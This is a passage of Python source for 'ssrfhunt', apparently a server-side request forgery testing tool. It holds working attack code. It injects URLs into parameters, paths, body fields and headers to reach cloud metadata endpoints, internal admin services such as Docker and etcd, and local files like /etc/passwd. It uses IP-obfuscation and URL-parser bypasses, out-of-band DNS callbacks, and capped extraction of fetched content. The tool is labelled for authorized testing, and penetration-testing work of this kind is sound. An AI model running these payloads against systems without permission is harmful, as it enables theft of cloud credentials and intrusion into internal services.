        itself is left untested.
        """
        ctype = self._body_content_type(base.headers)
        body = base.body or ""
        stripped = body.lstrip()
        points = []
        if "json" in ctype or stripped[:1] in ("{", "["):
            try:
                data = json.loads(body)
            except ValueError:
                self.con.debug("  body looks like JSON but did not parse "
                               "-- body injection skipped")
                return points
            paths = self._json_string_paths(data)
            if len(paths) > MAX_JSON_BODY_FIELDS:
                self.con.debug(f"  {len(paths)} string field(s) in JSON "
                               f"body -- testing the first {MAX_JSON_BODY_FIELDS}")
                paths = paths[:MAX_JSON_BODY_FIELDS]
            for path in paths:
                label = "body:" + ".".join(str(x) for x in path)
                points.append(("body-json", path, label,
                               lambda v, _p=path, _d=data: ReqSpec(
                                   base.method, base.url, base.headers,
                                   self._with_json_body(_d, _p, v))))
        elif "urlencoded" in ctype or (not ctype and "=" in body
                                       and "\n" not in body.strip()):
            pairs = parse_qsl(body, keep_blank_values=True)
            names = [k for k, _ in pairs if k.lower() not in NOISE_PARAMS]
            for name in dict.fromkeys(names):
                points.append(("body-form", name, f"body:{name}",
                               lambda v, _n=name: ReqSpec(
                                   base.method, base.url, base.headers,
                                   self._with_form_body(body, _n, v))))
        elif body:
            self.con.debug(f"  body present but content-type "
                           f"({ctype or 'unspecified'}) is neither form "
                           f"nor JSON -- body injection skipped")
        return points

    def _with_header(self, headers: dict, name: str, value: str) -> dict:
        out = dict(headers)
        out[name] = value
        return out

    def _header_points(self, base: ReqSpec):
        """
        Injection points inside the request's own headers -- each header's
        VALUE tested in turn, the header name and every other header left
        untouched. Hop-by-hop and clearly non-fetch headers (Host, auth,
        cookies, content negotiation, User-Agent) are skipped: replacing
        Cookie or Authorization would just break the request's own auth
        rather than test anything, and the request budget goes further on
        headers that plausibly carry a URL (Referer, Origin,
        X-Forwarded-Host, a custom API/webhook header, ...). Only ever
        non-empty for -r -- -u/-l requests carry no headers of their own.
        """
        points = []
        for name in base.headers:
            if name.lower() in HEADER_SKIP:
                continue
            points.append(("header", name, f"header:{name}",
                           lambda v, _n=name: ReqSpec(
                               base.method, base.url,
                               self._with_header(base.headers, _n, v),
                               base.body)))
        return points

    def injection_points(self, base: ReqSpec):
        """
        [(kind, locator, label, build)] -- every place a payload can go.
        build(value) always returns a full ReqSpec; whatever a point
        doesn't touch is carried over unchanged from base. Query parameters
        first: cheaper to reach and more often vulnerable. Path segments
        next, unless --no-path. Body fields (form or JSON) next, only when
        base carries one (-r with a POST/PUT/PATCH body) and --no-forms was
        not given. Headers last, unless --no-headers was given.
        """
        points = []
        for p in self.params_of(base.url):
            points.append(("param", p, f"param:{p}",
                           lambda v, _p=p: ReqSpec(
                               base.method, self._build(base.url, _p, v),
                               base.headers, base.body)))
        if not self.args.no_path:
            segs = [s for s in urlsplit(base.url).path.split("/") if s]
            for i, s in enumerate(segs):
                points.append(("path", i, f"path[{i}]:{s}",
                               lambda v, _i=i: ReqSpec(
                                   base.method,
                                   self._build_path(base.url, _i, v),
                                   base.headers, base.body)))
        if base.body and not self.args.no_forms:
            points.extend(self._body_points(base))
        if not self.args.no_headers:
            points.extend(self._header_points(base))
        return points

    def params_of(self, url: str) -> list[str]:
        parts = urlsplit(url)
        pairs = parse_qsl(parts.query, keep_blank_values=True)
        found = [k for k, _ in pairs]
        real = [p for p in found if p.lower() not in NOISE_PARAMS]
        dropped = len(found) - len(real)
        if dropped:
            self.con.debug(f"  dropped {dropped} tracking parameter(s)")
        if self.args.param:
            return [p for p in self.args.param.split(",") if p.strip()]
        if not real:
            return [] if self.args.no_guess else COMMON_PARAMS
        # URL-shaped parameters first -- named like a fetch target, or
        # already holding a URL as their value -- so a time-boxed scan finds
        # the likely hit before spending its budget on parameters that
        # probably don't reach a server-side fetch at all. Nothing is
        # dropped, only reordered.
        valmap = dict(pairs)
        def score(p):
            named = p.lower() in URL_LIKE_PARAMS
            valued = "://" in valmap.get(p, "")
            return (0 if (named or valued) else 1, p)
        return sorted(real, key=score)

    # ---- payload attempt generators

    def _metadata_attempts(self, tgt, vuln_host):
        base = urlsplit(tgt["url"])
        variants = (metadata_hosts(base.hostname) if _is_ipv4(base.hostname)
                   else [("plain", base.hostname)])
        for name, host in variants:
            payload = _mk_url(base.scheme, host, base.port, base.path, base.query)
            control = _mk_url(base.scheme, CONTROL_HOST, base.port, base.path,
                              base.query)
            yield f"cloud={tgt['cloud']}/{name}", payload, control

        q = f"?{base.query}" if base.query else ""
        port = base.port or 80
        port_part = f":{base.port}" if base.port else ""
        # "http:host" with no "//" -- some parsers/validators normalise this
        # back to a real URL before fetching, while a regex expecting "://"
        # never flags it.
        yield (f"cloud={tgt['cloud']}/no-slash-scheme",
               f"{base.scheme}:{base.hostname}{port_part}{base.path}{q}",
               f"{base.scheme}:{CONTROL_HOST}{port_part}{base.path}{q}")

        if vuln_host:
            # URL-parser discrepancy family (Orange Tsai): bait host up
            # front with an explicit port, real target after the confusing
            # separator. Ports on BOTH sides are what make the parsers
            # actually diverge -- see _PARSER_DISCREPANCY_FORMS.
            for name, auth_p, auth_c in _parser_discrepancy_authorities(
                    vuln_host, base.hostname, CONTROL_HOST, port):
                yield (f"cloud={tgt['cloud']}/{name}",
                       f"{base.scheme}://{auth_p}{base.path}{q}",
                       f"{base.scheme}://{auth_c}{base.path}{q}")

    def _internal_attempts(self, tgt, vuln_host):
        lead_names = {"plain", "localhost", "short"}
        port = tgt["port"]
        for name, host in loopback_hosts():
            netloc = f"{host}:{port}"
            payload = urlunsplit(("http", netloc, tgt["path"], "", ""))
            control = urlunsplit(("http", f"{CONTROL_HOST}:{port}",
                                  tgt["path"], "", ""))
            yield f"svc={tgt['label']}/{name}", payload, control
            if vuln_host and name in lead_names:
                if name == "plain":
                    # the richest treatment on the single most-likely-to-
                    # work spelling, to keep the request budget bounded.
                    for sep_name, auth_p, auth_c in \
                            _parser_discrepancy_authorities(
                                vuln_host, host, CONTROL_HOST, port):
                        yield (f"svc={tgt['label']}/{name}+{sep_name}",
                               f"http://{auth_p}{tgt['path']}",
                               f"http://{auth_c}{tgt['path']}")
                else:
                    p_netloc = f"{vuln_host}:80@{host}:{port}"
                    c_netloc = f"{vuln_host}:80@{CONTROL_HOST}:{port}"
                    yield (f"svc={tgt['label']}/{name}+userinfo-bypass",
                           f"http://{p_netloc}{tgt['path']}",
                           f"http://{c_netloc}{tgt['path']}")
        # "http:host" with no "//"
        yield (f"svc={tgt['label']}/no-slash-scheme",
               f"http:127.0.0.1:{port}{tgt['path']}",
               f"http:{CONTROL_HOST}:{port}{tgt['path']}")

    def _file_attempts(self, tgt):
        yield f"scheme=file/{tgt['os']}", tgt["uri"], f"file:///{CONTROL_FILE}"



    # ---- detection

    def _reflected(self, body: str, payload: str) -> bool:
        """
        The payload URL appearing verbatim means the app echoed the input
        back. That is reflection, not a server-side fetch, and is the
        classic false positive.
        """
        probe = payload[:60]
        return bool(probe) and probe in (body or "")

    def _confirm_chain(self, url, point, baseline, tgt, attempts):
        """Walk one target's attempts until one survives all four gates."""
        kind, _loc, label, build = point
        tname = tgt.get("label") or tgt.get("cloud", "")
        for technique, payload_url, control_url in attempts:
            spec = build(payload_url)
            r = self.http.send(spec)
            self._probe()
            hit = r.ok and bool(tgt["re"].search(r.body or ""))
            self.con.test(urlsplit(url).netloc, f"{label}={tname}",
                          r.status if r.ok else "err",
                          technique + ("  MATCH" if hit else ""))
            if not hit:
                continue

            if self._reflected(r.body, payload_url):
                self.con.debug(f"  {label}: signature present but payload "
                               f"echoed back — reflection, not a fetch")
                continue

            if tgt["re"].search(baseline.body or ""):
                self.con.debug(f"  {label}: baseline already matches {tname} "
                               f"— signature is part of the page, not a fetch")
                continue

            c = self.http.send(build(control_url))
            self._probe()
            if c.ok and tgt["re"].search(c.body or ""):
                self.con.debug(f"  {label}: non-routable control also "
                               f"matches — the page returns this regardless")
                continue

            r2 = self.http.send(spec)
            self._probe()
            if not (r2.ok and tgt["re"].search(r2.body or "")):
                self.con.debug(f"  {label}: did not reproduce on replay")
                continue

            return technique, payload_url, spec, r2
        return None

    def _try_family(self, url, point, baseline, targets, attempts_fn, sev,
                    title_fn) -> bool:
        kind, _loc, label, build = point
        for tgt in targets:
            result = self._confirm_chain(url, point, baseline, tgt,
                                         attempts_fn(tgt))
            if not result:
                continue
            technique, payload_url, spec, r2 = result
            proof = self._exfil(r2.body, tgt)
            self.add(Finding(
                title=title_fn(tgt, label),
                url=url, param=label, sev=sev,
                evidence=(f"technique={technique}\n"
                          f"payload={payload_url}\n"
                          f"Verified: signature matched, payload not "
                          f"reflected, baseline clean, non-routable control "
                          f"negative, reproduced on replay."),
                proof=proof,
                curl=self._curl_poc(spec)))
            return True
        return False

    def _oob_payload_variants(self, scheme, token):
        """
        Yield (technique, payload_url) for one OOB token: the plain form
        first, then filter-bypass spellings applied to the OOB HOST itself.

        A filter that blocks obvious outbound SSRF may still let an
        obfuscated host through, and since the whole point of an OOB probe
        is to make the server resolve/fetch a name we control, every one of
        these -- if it fires -- lands in the same DNS/HTTP collaborator log
        under the SAME token, so it needs no extra confirmation machinery.
        The bait host uses a NON-token label under the same OOB domain, so
        it can never itself carry the token and cause a false DNS match.
        Kept deliberately short (host-parsing tricks that don't need a
        second controlled host), so the per-point request count stays sane.
        """
        host = f"{token}.{self.args.oob_domain}"
        bait = f"allowed.{self.args.oob_domain}"
        yield "plain", f"{scheme}://{host}/"
        # scheme with no "//" -- dodges validators keyed on the "://" substring
        yield "no-slash-scheme", f"{scheme}:{host}/"
        # userinfo prefix: bait before '@', real OOB host after. A filter
        # substring-checking for an allowed host in the URL can be satisfied
        # by the bait while the request still resolves the OOB host.
        yield "userinfo-bypass", f"{scheme}://{bait}@{host}/"
        # parser-discrepancy siblings (Orange Tsai): raw '\' / '#' before the
        # real OOB host, ports on both sides so parsers actually diverge.
        yield "backslash-at-bypass", f"{scheme}://{bait}:80\\@{host}:80/"
        yield "fragment-at-bypass", f"{scheme}://{bait}:80#\\@{host}:80/"

    def _send_oob(self, url, point):
        """
        Send uniquely-labelled URLs under the user's OOB domain, then check
        each for two different kinds of evidence:

          ECHO (in-band, confirmable)  some self-hosted collaborator-style
              catchers respond to ANY request with content DERIVED from the
              subdomain label -- e.g. the label reversed. That derived value
              cannot pre-exist on the target's page (it is fresh, random,
              per probe) and cannot be produced by the app merely echoing
              our INPUT back (the input was the token, not its reverse) --
              so if it shows up in the app's own response and reproduces on
              replay, that is a genuine confirmed finding: the app fetched
              an attacker-chosen external URL and reflected real external
              content back. This needs nothing beyond the OOB domain the
              user already controls, so it runs whenever --oob-domain is
              set, with no --in-band required.

          BLIND (out-of-band, not confirmable here)  the far more common
              case: the app fetches the URL but this response never shows
              it (async job, no reflection at all). Recorded in the
              end-of-run manifest, and, if --dns-log is given, checked
              against the DNS server's log (incrementally, and again at the
              end of the run).

        For each (scheme, bypass-variant) a fresh token is sent, so every
        obfuscated spelling that reaches the OOB host is independently
        correlatable in the collaborator/DNS log. Not every collaborator
        server echoes anything -- interactsh's public instance, for one,
        does not. When it doesn't, the echo check simply never matches and
        every probe falls through to the manifest exactly as before.
        """
        if not self.args.oob_domain:
            return
        kind, _loc, label, build = point
        for scheme in ("http", "https"):
            for technique, payload in self._oob_payload_variants(
                    scheme, "ssrf-" + secrets.token_hex(4)):
                if self._confirm_budget_reached(url):
                    self.con.debug(f"  {label}: --confirm-x limit reached "
                                   f"for this URL, stopping OOB probes")
                    return
                token = self._token_of(payload)
                self._send_one_oob(url, label, build, scheme, technique,
                                   token, payload)

    @staticmethod
    def _token_of(payload: str) -> str:
        """
        The token is the label immediately left of the OOB domain -- i.e.
        the FIRST dotted label that starts with 'ssrf-'. Parsing it out of
        the payload (rather than threading it through) keeps token and
        wire-form guaranteed identical across every bypass spelling.
        """
        m = re.search(r"(ssrf-[0-9a-f]{8})", payload)
        return m.group(1) if m else ""

    def _send_one_oob(self, url, label, build, scheme, technique, token, payload):
        echo = token[::-1]
        spec = build(payload)
        r = self.http.send(spec)
        self._probe()
        hit = r.ok and echo in (r.body or "")
        self.con.test(urlsplit(url).netloc, f"{label}=oob:{scheme}/{technique}",
                      r.status if r.ok else "err",
                      f"token={token}" + ("  MATCH (echoed)" if hit else ""))

        confirmed = False
        confirmed_via = None
        if hit:
            r2 = self.http.send(spec)
            self._probe()
            confirmed = r2.ok and echo in (r2.body or "")
            if not confirmed:
                self.con.debug(f"  {label}: OOB echo seen once but did "
                               f"not reproduce on replay")
            else:
                confirmed_via = "echo"
                body = r2.body or ""
                i = body.find(echo)
                self.add(Finding(
                    title=f"SSRF — external URL fetched and reflected "
                          f"(confirmed via OOB echo) via '{label}'",
                    url=url, param=label, sev=HIGH,
                    evidence=(
                        f"technique=oob-echo/{scheme}/{technique}\n"
                        f"payload={payload}\n"
                        f"Verified: response contains '{echo}', the "
                        f"reverse of this probe's random token "
                        f"'{token}' -- a value that cannot pre-exist on "
                        f"the page and can only appear if "
                        f"{self.args.oob_domain} was actually fetched "
                        f"and its response reflected back; reproduced "
                        f"on replay."),
                    proof=self._cap(body[max(0, i - 64):]),
                    curl=self._curl_poc(spec)))

        with self._lk:
            self.oob_sent.append({"url": url, "param": label,
                                  "scheme": scheme, "technique": technique,
                                  "token": token, "payload": payload,
                                  "spec": spec, "confirmed": confirmed,
                                  "confirmed_via": confirmed_via})

        # Incremental DNS-log confirmation: if --confirm-x is in play we must
        # know, mid-URL, how many findings are already confirmed -- the
        # end-of-run pass would be too late to stop anything. Cheap enough
        # to re-check on OOB sends since --dns-log runs are I/O-bound anyway.
        if self.args.dns_log and not confirmed and self.args.confirm_x:
            self._dns_confirm_pending(only_url=url)

    def _dns_confirm_pending(self, only_url=None):
        """
        Read the DNS server's log and confirm any pending OOB token found in
        it. Used both incrementally (during a URL's OOB probes, when
        --confirm-x needs a live count) and once at the end of the run.
        only_url restricts the confirmation pass to one URL's tokens, so an
        incremental check stays cheap. A random token cannot appear by
        coincidence, so a plain substring match needs no BIND/dnsmasq-
        specific parsing. Only the most recent DNS_LOG_TAIL_BYTES is read.
        Returns the number of NEW confirmations made in this pass.
        """
        path = self.args.dns_log
        try:
            size = os.path.getsize(path)
            with open(path, encoding="utf-8", errors="replace") as fh:
                if size > DNS_LOG_TAIL_BYTES:
                    fh.seek(size - DNS_LOG_TAIL_BYTES)
                content = fh.read().lower()
        except OSError as e:
            # Report once, then stay quiet: an unreadable log on every OOB
            # send would drown the output.
            if not getattr(self, "_dns_log_err_shown", False):
                self.con.error(f"--dns-log: cannot read {path}: {e}")
                self._dns_log_err_shown = True
            return 0
        new = 0
        with self._lk:
            pending = [o for o in self.oob_sent if not o["confirmed"]
                      and (only_url is None or o["url"] == only_url)]
        for o in pending:
            if o["token"].lower() in content:
                o["confirmed"] = True
                o["confirmed_via"] = "dns-log"
                new += 1
                self.add(Finding(
                    title=f"SSRF — blind, confirmed via DNS resolution "
                          f"via '{o['param']}'",
                    url=o["url"], param=o["param"], sev=MED,
                    evidence=(
                        f"technique=oob-dns/{o['scheme']}/"
                        f"{o.get('technique', 'plain')}\n"
                        f"payload={o['payload']}\n"
                        f"Verified: token '{o['token']}' found in {path} -- "
                        f"the target's server resolved "
                        f"{o['token']}.{self.args.oob_domain}, proving "
                        f"outbound DNS resolution even with nothing "
                        f"reflected back in the HTTP response."),
                    verified_note=f"VERIFIED — confirmed via DNS log ({path})",
                    curl=self._curl_poc(o["spec"])))
        return new

    def check_dns_log(self, path: str):
        """End-of-run confirmation pass over every still-pending token."""
        self._dns_confirm_pending()

    def _confirmed_count(self, url):
        with self._lk:
            return sum(1 for o in self.oob_sent
                      if o["url"] == url and o["confirmed"])

    def _confirm_budget_reached(self, url) -> bool:
        """
        True when --confirm-x is set and this URL already has that many
        browser-/DNS-confirmed findings, so its remaining probes can stop.
        No effect unless both --confirm-x and --dns-log are in play (nothing
        gets *confirmed* without a confirmation source).
        """
        if not self.args.confirm_x or not self.args.dns_log:
            return False
        return self._confirmed_count(url) >= self.args.confirm_x

    def _curl_poc(self, spec: ReqSpec) -> str:
        """A copy-pasteable reproduction, method/headers/body included."""
        parts = ["curl", "-sk"]
        if spec.method != "GET":
            parts += ["-X", spec.method]
        for k, v in (spec.headers or {}).items():
            if k.lower() in ("content-length", "transfer-encoding", "host"):
                continue
            vv = v.replace("'", "'\\''")
            parts += ["-H", f"'{k}: {vv}'"]
        if spec.body:
            bb = spec.body.replace("'", "'\\''")
            parts += ["--data-raw", f"'{bb}'"]
        parts.append(f"'{spec.url}'")
        return " ".join(parts)

    # ---- exfiltration, capped

    def _exfil(self, body: str, tgt: dict) -> str:
        """
        Proof of fetch: the matched region only, capped hard. Enough for a
        report to be believed, not enough to be a data breach in itself.
        """
        m = tgt["re"].search(body or "")
        if not m:
            return ""
        start = max(0, m.start() - 64)
        return self._cap(body[start:start + EXFIL_MAX_BYTES])

    @staticmethod
    def _cap(text: str) -> str:
        text = text.replace("\r", "")
        lines = [ln for ln in text.split("\n") if ln.strip()][:EXFIL_MAX_LINES]
        out = "\n".join(lines)[:EXFIL_MAX_BYTES]
        return out + ("\n  … truncated (proof only) …"
                      if len(text) > len(out) else "")

    # ---- driver

    def _claim(self, method: str, url: str, kind: str, locator) -> bool:
        """
        True the first time an injection point is seen, False afterwards.
        Keyed on the METHOD and the NORMALISED path, so /product/123/detail
        and /product/456/detail are one template and get tested once, while
        a GET and a POST to the same path (e.g. -u and -r combined on the
        same endpoint) are correctly treated as two different tests.
        """
        parts = urlsplit(url)
        key = (method, parts.netloc.lower(), normalise_path(parts.path),
               kind, str(locator))
        with self._lk:
            if key in self._seen:
                self.deduped += 1
                return False
            self._seen.add(key)
            return True

    def test_point(self, url: str, point, baseline: Resp) -> bool:
        if self._confirm_budget_reached(url):
            return False
        if self.args.in_band:
            vuln_host = urlsplit(url).hostname or ""
            if self._try_family(
                    url, point, baseline, TARGETS_METADATA,
                    lambda t: self._metadata_attempts(t, vuln_host), CRIT,
                    lambda t, label: f"SSRF — {t['label']} disclosed via '{label}'"):
                return True
            if self._try_family(
                    url, point, baseline, TARGETS_INTERNAL,
                    lambda t: self._internal_attempts(t, vuln_host), HIGH,
                    lambda t, label:
                        f"SSRF — internal service reached ({t['label']}) via '{label}'"):
                return True
            if self._try_family(
                    url, point, baseline, TARGETS_FILE,
                    lambda t: self._file_attempts(t), CRIT,
                    lambda t, label:
                        f"SSRF — local file read ({t['label']}) via '{label}'"):
                return True
        self._send_oob(url, point)
        return False

    def run_target(self, base: ReqSpec):
        label = base.url if base.method == "GET" else f"{base.method} {base.url}"
        self.con.banner(f"Testing {label}")

        points = self.injection_points(base)
        if not points:
            self.skipped.append({"url": base.url, "reason": "no injection point"})
            hint = " (guessing disabled via --no-guess)" if self.args.no_guess else ""
            self.con.skip(f"{base.url} — nothing to inject into "
                          f"(no parameter, no path segment, no body field, "
                          f"no header){hint}")
            return

        fresh = [pt for pt in points
                if self._claim(base.method, base.url, pt[0], pt[1])]
        if not fresh:
            self.con.skip(f"{base.url} — all {len(points)} injection "
                          f"point(s) already tested on this route template")
            return

        baseline = self.http.send(base)
        if not baseline.ok:
            self.skipped.append({"url": base.url, "reason": baseline.error[:70]})
            self.con.skip(f"{base.url} — no response ({baseline.error[:50]})")
            return

        dupes = len(points) - len(fresh)
        self.con.info(f"{len(fresh)} injection point(s): "
                      + ", ".join(pt[2] for pt in fresh)
                      + (f"  ({dupes} already tested, skipped)" if dupes else ""))

        for pt in fresh:
            if self._confirm_budget_reached(base.url):
                self.con.info(f"--confirm-x {self.args.confirm_x} reached "
                              f"for this URL — remaining injection point(s) "
                              f"skipped")
                break
            self.test_point(base.url, pt, baseline)


# ----------------------------------------------------------------------------
# cli
# ----------------------------------------------------------------------------

BANNER = r"""
  ssrfhunt — server-side request forgery testing
  authorized testing only
"""

EPILOG = """
why signatures, not reflection or status code
  A 200 response proves nothing about SSRF, and a URL echoed back into the
  page proves only that the input was reflected. Every candidate here must
  produce structure the payload never contained -- metadata JSON keys, a
  known service banner, a real /etc/passwd line -- and must then pass four
  gates:

    1. the payload URL must NOT appear verbatim in the response  (reflection)
    2. the baseline response must NOT already match               (page content)
    3. a non-routable control host must NOT match                 (catch-all page)
    4. the hit must reproduce on replay                            (one-off/cache)

  A candidate failing any gate is dropped, and says so at -v 2.

default behaviour  -b/--oob-domain DOMAIN
  With no other flag, this sends ONLY out-of-band probes -- it touches
  nothing but the target and a domain you control (your Burp Collaborator,
  interact.sh instance, or a domain with query logging). Per injection
  point it sends, for each of http and https, several labelled spellings of
  the OOB URL: the plain form plus filter-bypass forms applied to the OOB
  host itself (scheme with no "//", a userinfo-prefixed bait host, and the
  raw-backslash / fragment URL-parser-discrepancy forms). A filter that
  blocks the plain outbound fetch may still let an obfuscated spelling
  through, and every spelling that reaches the OOB host lands in your
  collaborator/DNS log under its own token. The IP-obfuscation and internal-
  service payloads (169.254.169.254, Docker, file://, ...) are a DIFFERENT,
  more intrusive class and stay behind --in-band -- an OOB-only run does not
  send them, which is why an OOB-only run shows only the OOB spellings.
  Three outcomes per probe:
    - echoed back (confirmed): some self-hosted catchers reply to any
      request with content derived from the subdomain label -- this script
      knows one such scheme, the label reversed -- so it computes the
      expected echo per probe and checks the app's own response for it. A
      match, reproduced on replay, is reported as a genuine finding right
      away. Public interactsh and other silent catchers just never match
      this, at no extra cost.
    - DNS-confirmed (--dns-log FILE): if nothing is echoed back but your
      resolver still logged the lookup, pointing --dns-log at that log
      confirms it by looking for the token there -- incrementally during
      the run when --confirm-x is set, and once more at the end.
    - not confirmed (the common case without --dns-log): recorded in an
      end-of-run manifest for you to correlate against your own
      collaborator/DNS logs by hand.
  Without --oob-domain and without --in-band, there is nothing to send, and
  the run is refused up front rather than completing having tested nothing.

early stop  --confirm-x N  (default 3, needs --dns-log)
  Once N findings on a given URL are confirmed (via echo or --dns-log),
  the remaining probes and injection points for THAT URL are skipped and
  the scan moves on -- a time-saver on a target already proven vulnerable
  several ways over. It only counts CONFIRMED findings, so without a
  confirmation source (--dns-log, or a catcher that echoes) it never
  triggers and every probe runs as usual.

raw HTTP requests  -r FILE
  A request captured from Burp Suite ("Copy to file" / "Save item") or
  hand-written: request line, headers, blank line, optional body. Method,
  headers (cookies, auth, custom headers) and body are all reused for
  every probe -- this is what lets an authenticated or POST-only endpoint
  get tested at all, since -u alone always sends a bare GET. Combines with
  -u/-l as one more target in the same run.
    - scheme: there is no way to recover http vs https from the raw request
      bytes alone (TLS is a layer below them), so it is inferred: an Origin
      or Referer header's own scheme is used if either is present,
      otherwise http. --force-ssl overrides this to https unconditionally,
      for a request with neither header that still needs it.
    - body injection (--no-forms to disable): a JSON body (Content-Type:
      ...json, or the body starts with '{'/'[') gets every string value at
      any depth tested, capped at 30 fields; a form-urlencoded body gets
      every field tested. Multipart and any other body encoding are not
      parsed -- query and path injection still run normally on such a
      request, only the body itself is left untested.
    - header injection (--no-headers to disable): each header's own value
      is tested in turn, everything else left untouched. Hop-by-hop and
      auth-carrying headers (Host, Cookie, Authorization, User-Agent,
      content negotiation) are skipped -- replacing those would just break
      the request rather than test anything; Referer, Origin, X-Forwarded-*
      and custom headers are fair game. Only ever finds something on -r --
      -u/-l requests carry no headers of their own.
    - Content-Length and Transfer-Encoding from the captured request are
      dropped and recomputed per probe, since the body's size changes with
      the payload; every other header is forwarded as captured, and -H on
      the command line overrides any header -r also set.

in-band payload families  --in-band  (tried in order, first confirmed hit
per point wins; opt-in, since these reach real infrastructure rather than
just a domain you already control)
  cloud metadata     169.254.169.254 (AWS/GCP/Azure/OCI), 100.100.100.200
                     (Alibaba), the in-cluster Kubernetes API. Usually the
                     highest-impact target -- a hit often hands over cloud
                     credentials. GCP and Azure normally require a header on
                     the request that reaches THEM, which this script cannot
                     set (that request is the vulnerable app's, not ours) --
                     they are tested anyway for the apps that proxy headers
                     through, at a correspondingly lower hit rate.
  internal services  Docker Engine, Elasticsearch, Consul, RabbitMQ,
                     Prometheus, etcd, Spring Actuator, Portainer -- admin
                     APIs that should never answer a request from outside.
  file scheme        file:///etc/passwd, file:///C:/Windows/win.ini, and
                     netdoc:///etc/passwd (Java's file:// equivalent), for
                     fetchers that honour one of them -- the classic
                     SSRF-to-LFI pivot.

  With --in-band, these three families are tried first for every injection
  point; --oob-domain (if also given) is only sent afterwards, and only if
  none of them confirmed.

host-obfuscation bypasses (--in-band only, from PayloadsAllTheThings' SSRF
filter-bypass list)
  Applied to cloud-metadata and internal-service hosts: decimal, hex, and
  four octal prefixes (0177/o177/0o177/q177 -- implementations genuinely
  differ on which they accept), IPv6-mapped (both compressed and fully
  expanded), and *.nip.io/*.sslip.io spellings, for filters that denylist
  the literal address string without parsing what it actually resolves to.
  A bare "scheme:host" with no "//" is tried too, for validators expecting
  the "://" substring.
  Loopback-only, on top of the above: short forms (127.1, 127.0.1, 0,
  0.0.0.0), three more addresses from the 127.0.0.0/8 block -- entirely
  reserved for loopback, so 127.127.127.127 routes locally exactly like
  127.0.0.1 does, confirmed by direct socket test -- IPv6 forms ([::1],
  [0000::1], the unspecified [::]), the ip6-localhost/ip6-loopback
  /etc/hosts aliases, and the localtest.me/localh.st/nip.io/sslip.io domain
  redirects.
  Allowlist-bypass forms (for filters that substring-check the URL for an
  expected host instead of parsing it): the classic userinfo trick
  (http://this-app's-own-domain@real-target/), and Orange Tsai's parser-
  discrepancy siblings that fool OTHER libraries the plain form does not --
  backslash-before-@, doubled @, colon-backslash-@, and a fragment (#)
  variant. These reproduce the exact shapes from PayloadsAllTheThings'
  "Bypass Abusing URL Parsing Discrepancy" (bait and target both carry an
  explicit :port -- that is what makes the parsers diverge), and the raw
  backslash is written on the wire literally (as curl does), not percent-
  encoded, so the target's own parser sees the '\\' the bypass relies on.
  The non-routable control host is sent through the identical form, so a
  catch-all page can't turn one of these into a false positive.

injection points
  Query parameters, path segments, body fields (-r, unless --no-forms), and
  headers (-r, unless --no-headers) are all tested. Some URL-fetching
  features route by path rather than query (/proxy/<url-encoded-target>,
  /thumbnail/<url-encoded-target>), common in image-proxy/CDN/thumbnail
  services. --no-path restricts testing to query parameters; path testing
  multiplies the request count by the number of segments.

parameters
  Every non-tracking parameter present is tested; ones named or valued like
  a fetch target (url, redirect, webhook, an existing http(s):// value, ...)
  are tried first so a time-boxed scan surfaces a likely hit sooner, but
  nothing is skipped on name alone. Tracking parameters (gclid, fbclid,
  utm_*, msclkid ...) never reach a server-side fetch and are dropped
  automatically. --param overrides selection entirely; common fetch-
  parameter names are tried by default when a URL carries none of its own
  (query string only -- it does not fabricate body fields), disable that
  with --no-guess.

repeated routes
  Injection points already tested are not tested again, keyed on the
  request METHOD and the NORMALISED path: identifier-looking segments
  (numeric, UUID, hex, date) collapse to placeholders, so /product/123/detail
  and /product/456/detail are recognised as one route template and tested
  once, while a GET and a POST to the same path are still tested separately.

colour
  On by default. Disable with --no-color or NO_COLOR=1.

status line
  In -l mode a heartbeat prints every 30s (--status-interval) at any
  verbosity. Not shown for -u/-r alone.

limitations, stated plainly
  With only -b/--oob-domain (the default) and no --dns-log, a blind
  (non-reflecting) fetcher whose DNS lookups you can't see shows up only in
  the end-of-run manifest, for manual correlation. With --in-band and no
  --oob-domain, confirmed in-band candidates still get reported, but a
  blind fetcher shows nothing at all. gopher://, dict://, sftp://, tftp://,
  ldap:// and jar: protocol smuggling for blind interaction with non-HTTP
  internal services is not attempted -- crafting and confirming that
  reliably needs a listener this script does not run. Redirect-based
  filter bypass (302/307 to the real target via a whitelisted host) and DNS
  rebinding are not attempted either -- both need hosting infrastructure of
  their own, not just payload variety. -r's body injection does not parse
  multipart/form-data.

examples
  ssrfhunt.py -u 'https://target/p?id=1' -b abcd1234.oast.fun
  ssrfhunt.py -u 'https://target/preview?url=https://example.com/x.png' \\
              -b abcd1234.oast.fun --in-band -v 1
  ssrfhunt.py -r request.txt --force-ssl -b abcd1234.oast.fun \\
              --dns-log /var/log/named/queries.log
  ssrfhunt.py -l urls.txt -b abcd1234.oast.fun \\
              --dns-log /var/log/named/queries.log --confirm-x 2
  ssrfhunt.py -l urls.txt --in-band --param url,webhook --no-path -t 8
  ssrfhunt.py -r request.txt --in-band --no-headers --no-forms
"""


def build_parser():
    p = argparse.ArgumentParser(
        prog="ssrfhunt.py", description=BANNER, epilog=EPILOG,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("-v", type=int, default=0, choices=[0, 1, 2], dest="verbosity",
                   help="0 = confirmed findings only (default), 1 = every test, "
                        "2 = debug (shows why candidates were rejected)")
    p.add_argument("-u", "--url", help="single target URL")
    p.add_argument("-l", "--list", help="file of target URLs, one per line")
    p.add_argument("-r", "--request-file", metavar="FILE", dest="request_file",
                   help="target defined by a raw HTTP request file (Burp "
                        "'Copy to file' / 'Save item' format, or hand-"
                        "written) -- method, headers and body are all "
                        "reused for every probe, and body fields (form or "
                        "JSON) are injected alongside query, path and "
                        "headers. Combines with -u/-l as one more target")
    p.add_argument("--force-ssl", action="store_true", dest="force_ssl",
                   help="force https for a -r request (default: http, "
                        "inferred from Origin/Referer)")
    p.add_argument("--no-color", action="store_true",
                   help="disable coloured output (colour is on by default)")
    p.add_argument("--status-interval", type=float, default=30.0, metavar="SEC",
                   help="seconds between status lines in -l mode (default 30)")
    p.add_argument("--no-path", action="store_true",
                   help="skip URL path segments, test query parameters only "
                        "(path testing multiplies request count by the "
                        "number of segments)")
    p.add_argument("--param", metavar="LIST",
                   help="test only these comma-separated parameters")
    p.add_argument("--no-guess", action="store_true",
                   help="don't try common parameter names on parameterless URLs")
    p.add_argument("--no-headers", action="store_true",
                   help="skip header tests")
    p.add_argument("--no-forms", action="store_true",
                   help="skip form tests")
    p.add_argument("-t", "--threads", type=int, default=4,
                   help="concurrent targets (default 4)")
    p.add_argument("-H", "--header", action="append", default=[],
